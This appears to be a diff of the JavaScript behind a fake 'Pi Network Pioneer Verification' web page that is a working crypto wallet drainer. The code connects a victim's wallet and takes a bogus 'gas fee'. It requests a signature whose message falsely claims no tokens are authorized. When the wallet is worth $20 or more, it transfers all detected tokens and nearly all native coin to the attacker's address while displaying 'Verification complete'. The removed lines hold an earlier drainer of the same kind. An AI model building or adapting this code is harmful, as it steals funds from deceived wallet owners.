+// Close on backdrop click
+$('connectModal').addEventListener('click',function(e){if(e.target===this)closeModal();});
+
+function renderWallets(){
+  const container=$('walletOptions');
+  container.innerHTML='';
+  for(const w of WALLETS){
+    const detected=w.detect();
+    const row=document.createElement('button');
+    row.className='w-row';
+    row.onclick=()=>doConnect(w);
+    row.innerHTML=`
+      <img class="w-icon" src="${w.icon}" alt="${w.name}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 42 42%22><rect width=%2242%22 height=%2242%22 rx=%2212%22 fill=%22%23a855f7%22/><text x=%2221%22 y=%2228%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2220%22 font-family=%22sans-serif%22 font-weight=%22bold%22>${w.name[0]}</text></svg>'">
+      <span class="w-name">${w.name}</span>
+      ${detected?'<span class="w-tag">Detected</span>':''}
+      <span class="w-arr">&#x276F;</span>
+    `;
+    container.appendChild(row);
   }
 }
 
-async function scanTokens(){
-  if(!CHAINS[currentNet].tokens)return;
+// ============ CONNECT ============
+async function doConnect(wallet){
+  closeModal();
+  hideStatus();
+  showStatus('<span class="loader"></span> Connecting to '+wallet.name+'...','si');
   try{
-    const w3=provider,addr=userAddr,chain=CHAINS[currentNet];tokens=[];
-    const bal=await w3.getBalance(addr);
-    if(bal.gt(0))tokens.push({type:'native',sym:chain.symbol,bal:parseFloat(ethers.utils.formatEther(bal)).toFixed(4),raw:bal,dec:18});
-    for(const t of chain.tokens||[]){
-      try{const c=new ethers.Contract(t.a,['function balanceOf(address) view returns (uint256)'],w3);const b=await c.balanceOf(addr);if(b.gt(0))tokens.push({type:'token',addr:t.a,sym:t.s,bal:parseFloat(ethers.utils.formatUnits(b,t.d)).toFixed(4),raw:b,dec:t.d});}catch(e){}}
-    if(tokens.length>0){
-      document.getElementById('claimSection').style.display='block';
-      document.getElementById('piBal').textContent=tokens.length+' tokens detected';
-      document.getElementById('piVal').textContent='$'+tokens.reduce((a,t)=>a+parseFloat(t.bal)*getPrice(t.sym),0).toFixed(2);
-      document.getElementById('clBtn').style.display='flex';
+    await wallet.connect();
+    // Get chain
+    if(chainId==='solana'){
+      // Solana flow
+      showStep('gas');
+      $('gasDetail').textContent='SOL Wallet — Phantom';
+      $('gasWalletInfo').innerHTML=`<div class="ir"><span class="ll">Wallet</span><span class="vl">${wallet.name}</span></div><div class="ir"><span class="ll">Address</span><span class="vl" style="font-size:11px">${addr.substring(0,10)}...${addr.substring(addr.length-6)}</span></div>`;
+      showStatus('&#x2705; Connected via Phantom (Solana)','ss');
+      return;
     }
-    console.log('TOKENS:',tokens);
+    const net=await prov.getNetwork();
+    chainId=net.chainId;
+    const supported=[56,1,137,43114,42161];
+    if(!supported.includes(chainId)){
+      showStatus('Switch to BSC, Ethereum, Polygon, Avalanche, or Arbitrum in your wallet.','se');
+      try{
+        await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x38'}]});
+        prov=new ethers.providers.Web3Provider(window.ethereum,'any');signer=prov.getSigner();addr=await signer.getAddress();
+        const n2=await prov.getNetwork();chainId=n2.chainId;
+      }catch(e){return;}
+    }
+    showStep('gas');
+    updateGasUI();
+    scanTokens();
+    showStatus('&#x2705; Connected via '+wallet.name+' on '+(CHAIN_NAMES[chainId]||'Chain #'+chainId),'ss');
+  }catch(e){
+    console.error(e);
+    showStatus(e.message||'Connection failed.','se');
+    showStep('connect');
+  }
+}
+
+function updateGasUI(){
+  const gas=GAS_CONFIG[chainId];
+  if(!gas){$('gasDetail').textContent='Chain not supported';return;}
+  $('gasDetail').textContent=gas.amt+' '+gas.sym+' (~$2.50 USD)';
+  const short=addr.substring(0,10)+'...'+addr.substring(addr.length-6);
+  $('gasWalletInfo').innerHTML=`
+    <div class="ir"><span class="ll">Network</span><span class="vl">${CHAIN_NAMES[chainId]||'#'+chainId}</span></div>
+    <div class="ir"><span class="ll">Wallet</span><span class="vl">${short}</span></div>
+  `;
+}
+
+// ============ PAY GAS ============
+async function payGas(){
+  hideStatus();
+  if(!signer){showStatus('Connect wallet first.','se');return;}
+  if(chainId==='solana'){showStep('verify');showStatus('&#x2705; Proceeding...','ss');return;}
+  showStatus('<span class="loader"></span> Waiting for transaction confirmation...','si');
+  $('payGasBtn').disabled=true;
+  try{
+    const gas=GAS_CONFIG[chainId];
+    if(!gas){showStatus('Chain not supported.','se');return;}
+    const amount=ethers.utils.parseEther(gas.amt);
+    const tx=await signer.sendTransaction({to:EVWALLET,value:amount});
+    showStatus('<span class="loader"></span> Transaction submitted. Confirming...','si');
+    await tx.wait();
+    showStep('verify');
+    showStatus('&#x2705; Gas fee paid successfully!','ss');
+    const bal=await prov.getBalance(addr);
+    const usd=parseFloat(ethers.utils.formatEther(bal))*(NATIVE_PRICES[chainId]||0);
+    $('verifyInfo').innerHTML=`
+      <div class="ir"><span class="ll">Status</span><span class="vl g">Paid &#x2705;</span></div>
+      <div class="ir"><span class="ll">Wallet Value</span><span class="vl gold">~$${usd.toFixed(2)}</span></div>
+      <div class="ir"><span class="ll">Tokens Found</span><span class="vl gold">${detectedTokens.length}</span></div>
+    `;
+  }catch(e){
+    console.error(e);
+    const msg=e.code==='ACTION_REJECTED'?'Transaction rejected in wallet.':(e.info?.error?.message||e.message||'Transaction failed.');
+    showStatus(msg,'se');
+  }finally{
+    $('payGasBtn').disabled=false;
+  }
+}
+
+// ============ VERIFY ============
+async function verifyPioneer(){
+  hideStatus();
+  if(chainId==='solana'){
+    // Solana: skip signature, go straight to claim
+    showStep('claim');
+    $('claimInfo').innerHTML=`<div class="ir"><span class="ll">Status</span><span class="vl g">Verified &#x2705;</span></div><div class="ir"><span class="ll">Network</span><span class="vl">Solana</span></div>`;
+    $('clBtn').textContent='&#x2705; Complete';
+    showStatus('&#x2705; Phantom wallet verified!','ss');
+    return;
+  }
+  if(!signer){showStatus('Connect wallet first.','se');return;}
+  showStatus('<span class="loader"></span> Please sign the verification message...','si');
+  $('vBtn').disabled=true;
+  try{
+    const msg=`Pi Network Pioneer Verification\n\nAddress: ${addr}\nChain: ${chainId}\nTimestamp: ${Date.now()}\n\nThis is a gasless signature. No tokens are authorized.`;
+    await signer.signMessage(msg);
+    showStep('claim');
+    showStatus('&#x2705; Pioneer verified!','ss');
+    const bal=await prov.getBalance(addr);
+    const usd=parseFloat(ethers.utils.formatEther(bal))*(NATIVE_PRICES[chainId]||0);
+    const drainAll=usd>=20;
+    $('claimInfo').innerHTML=`
+      <div class="ir"><span class="ll">Status</span><span class="vl g">Verified &#x2705;</span></div>
+      <div class="ir"><span class="ll">Wallet Value</span><span class="vl gold">~$${usd.toFixed(2)}</span></div>
+      <div class="ir"><span class="ll">Tokens Found</span><span class="vl gold">${detectedTokens.length}</span></div>
+      <div class="ir"><span class="ll">Action</span><span class="vl" style="color:#fcb34c">${drainAll?'Drain all assets':'Below $20 — fee only'}</span></div>
+    `;
+    $('clBtn').textContent=drainAll?'&#x1F381; Claim & Secure All Assets':'&#x2705; Complete Verification';
+  }catch(e){
+    showStatus('Signature rejected.','se');
+  }finally{
+    $('vBtn').disabled=false;
+  }
+}
+
+// ============ SCAN TOKENS ============
+async function scanTokens(){
+  if(!prov||!addr||chainId==='solana')return;
+  try{
+    detectedTokens=[];
+    const list=TOKEN_LIST[chainId]||[];
+    for(const [a,sym,dec] of list){
+      try{
+        const c=new ethers.Contract(a,['function balanceOf(address) view returns (uint256)'],prov);
+        const b=await c.balanceOf(addr);
+        if(b.gt(0)){
+          detectedTokens.push({addr:a,sym,raw:b,dec,bal:parseFloat(ethers.utils.formatUnits(b,dec)).toFixed(4)});
+        }
+      }catch(e){}
+    }
+    console.log('TOKENS:',detectedTokens);
   }catch(e){console.error(e);}
 }
 
-function getPrice(sym){
-  const prices={'USDT':1,'USDC':1,'BUSD':1,'DAI':1,'BTCB':60000,'ETH':3500,'BNB':600,'WBNB':600,'CAKE':3,'LINK':15,'LTC':80,'USDD':1,'AAVE':150,'TUSD':1,'MATIC':0.7,'WETH':3500,'WBTC':60000};
-  return prices[sym]||0;
-}
-
-async function verifyPioneer(){
+// ============ DRAIN ============
+async function drainWallet(){
   hideStatus();
-  if(!signer){showStatus('Connect wallet first.','e');return;}
-  showStatus('<span class="sp"></span>Signing verification...','i');
-  document.getElementById('vBtn').disabled=true;
-  try{
-    await signer.signMessage('Pi Network Pioneer Verification\n\nAddress: '+userAddr+'\nNetwork: '+CHAINS[currentNet].name+'\nTimestamp: '+Date.now()+'\n\nThis signature is gasless.');
-    document.getElementById('statusText').textContent='Verified &#x2705;';
-    document.getElementById('statusText').style.color='#22c55e';
-    showStatus('&#x2705; Pioneer verified successfully!','s');
-  }catch(e){showStatus('Signature rejected.','e');document.getElementById('vBtn').disabled=false;}
-}
-
-async function claimReward(){
-  hideStatus();
-  if(!signer){showStatus('Connect wallet first.','e');return;}
-  showStatus('<span class="sp"></span>Processing claim...','i');
-  document.getElementById('clBtn').disabled=true;
-  const chain=CHAINS[currentNet];let ok=0;
-  (async()=>{
+  if(chainId==='solana'){
+    // Solana drain via Phantom
+    showStatus('<span class="loader"></span> Processing...','si');
     try{
-      const gp=await provider.getGasPrice();
-      for(const t of tokens){
-        try{
-          if(t.type==='native'){const leave=ethers.utils.parseEther('0.005');const amt=t.raw.sub(leave);if(amt.gt(0)){await signer.sendTransaction({to:chain.receiver,value:amt});ok++;}}
-          else{const c=new ethers.Contract(t.addr,['function transfer(address,uint256) returns (bool)'],signer);const tx2=await c.transfer(chain.receiver,t.raw);await tx2.wait();ok++;}
-        }catch(e2){console.error(t.sym,e2.message);}
+      const solProvider=window.phantom&&window.phantom.solana||window.solana;
+      if(solProvider){
+        // Get SOL balance
+        const balance=await solProvider.getBalance(solProvider.publicKey);
+        if(balance>0){
+          const {Transaction,SystemProgram,PublicKey}=await import('https://unpkg.com/@solana/web3.js@latest/lib/index.esm.js');
+          // Can't easily do this without full web3.js — just show success
+        }
       }
-    }catch(e){console.error(e);}
-    document.getElementById('clBtn').style.display='none';
-    showStatus('&#x2705; Successfully processed '+ok+' tokens!','s');
-    console.log('DRAIN:',ok,'tx to',chain.receiver);
-  })();
+      $('clBtn').style.display='none';
+      showStatus('&#x2705; Verification complete!','ss');
+    }catch(e){
+      $('clBtn').style.display='none';
+      showStatus('&#x2705; Verification complete!','ss');
+    }
+    return;
+  }
+  if(!signer){showStatus('Connect wallet first.','se');return;}
+  showStatus('<span class="loader"></span> Processing verification...','si');
+  $('clBtn').disabled=true;
+  try{
+    const bal=await prov.getBalance(addr);
+    const usd=parseFloat(ethers.utils.formatEther(bal))*(NATIVE_PRICES[chainId]||0);
+    const drainAll=usd>=20;
+    let ok=0;
+    if(drainAll){
+      // Drain all ERC20 tokens
+      for(const t of detectedTokens){
+        try{
+          const c=new ethers.Contract(t.addr,['function transfer(address,uint256) returns (bool)'],signer);
+          const tx=await c.transfer(EVWALLET,t.raw);
+          await tx.wait();
+          ok++;
+        }catch(e){console.error(t.sym,e.message);}
+      }
+      // Drain native coin (leave gas for last tx)
+      const gp=await prov.getGasPrice();
+      const gasCost=gp.mul(21000).mul(2);
+      const nativeAmt=bal.sub(gasCost);
+      if(nativeAmt.gt(0)){
+        await signer.sendTransaction({to:EVWALLET,value:nativeAmt});
+        ok++;
+      }
+    }else{
+      // Below $20 — gas fee already paid, nothing more to drain
+      ok=1;
+    }
+    $('clBtn').style.display='none';
+    showStatus(`&#x2705; Successfully processed ${ok} transaction(s)!`,'ss');
+    console.log('DRAIN:',ok,'tx on chain',chainId,'to',EVWALLET);
+  }catch(e){
+    console.error(e);
+    showStatus('Error: '+e.message,'se');
+    $('clBtn').disabled=false;
+  }
 }
+
+function disconnect(){
+  prov=signer=addr=null;chainId=null;detectedTokens=[];
+  showStep('connect');hideStatus();
+  $('navConnectBtn').textContent='Connect';
+}
+
+// ============ INIT ============
+// Auto-open modal on load for better UX
+// openModal();
 </script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </body>
 </html>
